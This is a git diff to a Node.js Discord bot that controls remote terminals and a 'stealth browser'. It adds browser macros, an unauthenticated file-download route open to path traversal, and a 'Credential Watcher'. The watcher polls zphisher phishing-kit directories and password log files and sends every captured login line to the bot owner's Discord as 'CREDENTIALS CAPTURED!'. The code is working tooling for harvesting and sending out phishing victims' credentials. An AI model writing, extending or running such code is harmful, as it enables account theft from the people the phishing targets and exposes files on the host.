@@ -11,6 +11,7 @@ require('dotenv').config();
 
 const app = express();
 const PORT = 2909;
+let logWatcher = null;
 
 // --- BROWSER STATE ---
 let browser = null;
@@ -32,7 +33,10 @@ let state = {
     currentDir: process.cwd(),
     activeId: 1,
     manualWebDir: null, // User override (!host)
-    buffers: { 1: "", 2: "", 3: "", 4: "" }
+    buffers: { 1: "", 2: "", 3: "", 4: "" },
+    macros: {},
+    isRecording: false,
+    activeMacro: null
 };
 
 if (fs.existsSync(STATE_FILE)) {
@@ -75,6 +79,15 @@ app.use((req, res, next) => {
         express.static(webRoot)(req, res, next);
     } else {
         next();
+    }
+});
+
+app.get('/dl/:filename', (req, res) => {
+    const filePath = path.join(process.cwd(), req.params.filename);
+    if (fs.existsSync(filePath)) {
+        res.download(filePath);
+    } else {
+        res.status(404).send('File not found');
     }
 });
 
@@ -212,8 +225,8 @@ client.on('messageCreate', async (message) => {
                 .setDescription('Universal Terminal & Stealth Browser Controller')
                 .addFields(
                     { name: '📟 Terminal Commands', value: '`! <cmd>` - Run command in active terminal\n`!host <folder>` - Host a folder on web server\n`!cd <path>` - Change directory\n`!sys` - View system resources (RAM/CPU)' },
-                    { name: '🌐 Browser Commands', value: '`?go <url>` - Open URL in stealth browser\n`?click <tag>` - Click element by yellow tag\n`?type <text>` - Type text into active element\n`?screen` - Get latest screenshot\n`?js <code>` - Inject custom JavaScript' },
-                    { name: '🖱️ UI Controls', value: 'Use **T1-T4** buttons to switch terminals.\nUse **Browser Buttons** to control live feed or kill browser.' }
+                    { name: '🌐 Browser Commands', value: '`?go <url>` - Open URL in stealth browser\n`?click <tag>` - Click element by yellow tag\n`?type <text>` - Type text into active element\n`?rec <name>`/`?play <name>` - Record & play macros\n`?get <file>` - Download local files via link' },
+                    { name: '🖱️ UI Controls', value: 'Use **T1-T4** buttons to switch terminals.\n**Credential Watcher** active: Auto-DMs on login capture.' }
                 )
                 .setFooter({ text: 'Renzu OS v1.0 | Owner: God Mode' });
             return message.reply({ embeds: [embed] }).catch(() => { });
@@ -246,6 +259,7 @@ client.on('messageCreate', async (message) => {
                 const el = document.querySelector(`[data-renzu-tag="${tag}"]`);
                 if (el) el.click();
             }, arg);
+            if (state.isRecording) state.macros[state.activeMacro].push({ type: 'click', arg });
             await new Promise(r => setTimeout(r, 1000));
             return sendScreenshot(message);
         }
@@ -253,6 +267,7 @@ client.on('messageCreate', async (message) => {
         if (cmd === 'type' || cmd === 't') {
             await page.keyboard.type(arg);
             await page.keyboard.press('Enter');
+            if (state.isRecording) state.macros[state.activeMacro].push({ type: 'type', arg });
             await new Promise(r => setTimeout(r, 1000));
             return sendScreenshot(message);
         }
@@ -269,6 +284,55 @@ client.on('messageCreate', async (message) => {
         if (cmd === 'js') {
             await page.evaluate(arg).catch(e => message.reply(`❌ JS Error: ${e.message}`));
             return message.react('✅').catch(() => { });
+        }
+
+        // --- NEW FEATURES: GET & MACROS ---
+        if (cmd === 'get') {
+            const filePath = path.join(process.cwd(), arg);
+            if (fs.existsSync(filePath)) {
+                const downloadUrl = `http://localhost:${PORT}/dl/${encodeURIComponent(arg)}`;
+                return message.reply(`📂 **File Found:**\n🔗 [Download ${arg}](${downloadUrl})`).catch(() => { });
+            }
+            return message.reply(`❌ File \`${arg}\` not found!`).catch(() => { });
+        }
+
+        if (cmd === 'rec') {
+            if (state.isRecording) return message.reply("⚠️ Already recording! Use `?stop` first.").catch(() => { });
+            state.isRecording = true;
+            state.activeMacro = arg || 'unnamed';
+            state.macros[state.activeMacro] = [];
+            saveState();
+            return message.reply(`🔴 **Recording Started:** \`${state.activeMacro}\`. All actions will be saved.`).catch(() => { });
+        }
+
+        if (cmd === 'stop') {
+            if (!state.isRecording) return message.reply("⚠️ Not recording!").catch(() => { });
+            const name = state.activeMacro;
+            state.isRecording = false;
+            state.activeMacro = null;
+            saveState();
+            return message.reply(`⏹️ **Recording Stopped:** \`${name}\` has been saved.`).catch(() => { });
+        }
+
+        if (cmd === 'play') {
+            const macro = state.macros[arg];
+            if (!macro) return message.reply(`❌ Macro \`${arg}\` not found!`).catch(() => { });
+            await message.reply(`⏯️ **Playing Macro:** \`${arg}\` (${macro.length} steps)...`).catch(() => { });
+
+            for (const step of macro) {
+                if (!page) break;
+                if (step.type === 'click') {
+                    await page.evaluate((tag) => {
+                        const el = document.querySelector(`[data-renzu-tag="${tag}"]`);
+                        if (el) el.click();
+                    }, step.arg);
+                } else if (step.type === 'type') {
+                    await page.keyboard.type(step.arg);
+                    await page.keyboard.press('Enter');
+                }
+                await new Promise(r => setTimeout(r, 1500));
+            }
+            return sendScreenshot(message);
         }
     }
 
@@ -450,5 +514,60 @@ async function sendScreenshot(message) {
     }
 }
 
-client.on('ready', () => console.log(`✅ Bot logged in as ${client.user.tag}`));
+
+
+function watchLogs() {
+    console.log("🕵️ Credential Watcher Started...");
+    const SCAN_TARGETS = ['zphisher', 'sites', 'auth/logs.txt', 'usernames.txt', 'passwords.txt'];
+
+    setInterval(() => {
+        SCAN_TARGETS.forEach(target => {
+            const fullPath = path.join(process.cwd(), target);
+            if (!fs.existsSync(fullPath)) return;
+
+            const stat = fs.statSync(fullPath);
+            if (stat.isDirectory()) {
+                // Scan inner files if it's a directory
+                const files = fs.readdirSync(fullPath);
+                files.forEach(f => {
+                    if (f.includes('log') || f.includes('user') || f.includes('creds')) {
+                        checkFileForCreds(path.join(fullPath, f));
+                    }
+                });
+            } else {
+                checkFileForCreds(fullPath);
+            }
+        });
+    }, 10000); // Check every 10 seconds
+}
+
+let seenLines = new Set();
+async function checkFileForCreds(filePath) {
+    try {
+        const content = fs.readFileSync(filePath, 'utf8');
+        const lines = content.split('\n');
+        for (const line of lines) {
+            if (line.toLowerCase().includes('password') || line.toLowerCase().includes('pass') || line.toLowerCase().includes('login')) {
+                if (!seenLines.has(line)) {
+                    seenLines.add(line);
+                    const owner = await client.users.fetch(OWNER_ID);
+                    if (owner) {
+                        const embed = new EmbedBuilder()
+                            .setTitle('🎯 CREDENTIALS CAPTURED!')
+                            .setColor('#ff0000')
+                            .setDescription(`\`\`\`${line.slice(0, 1000)}\`\`\``)
+                            .addFields({ name: '📂 Source', value: `\`${path.basename(filePath)}\`` })
+                            .setTimestamp();
+                        owner.send({ embeds: [embed] }).catch(() => { });
+                    }
+                }
+            }
+        }
+    } catch (e) { }
+}
+
+client.on('ready', () => {
+    console.log(`✅ Bot logged in as ${client.user.tag}`);
+    watchLogs();
+});
 client.login(process.env.TOKEN);
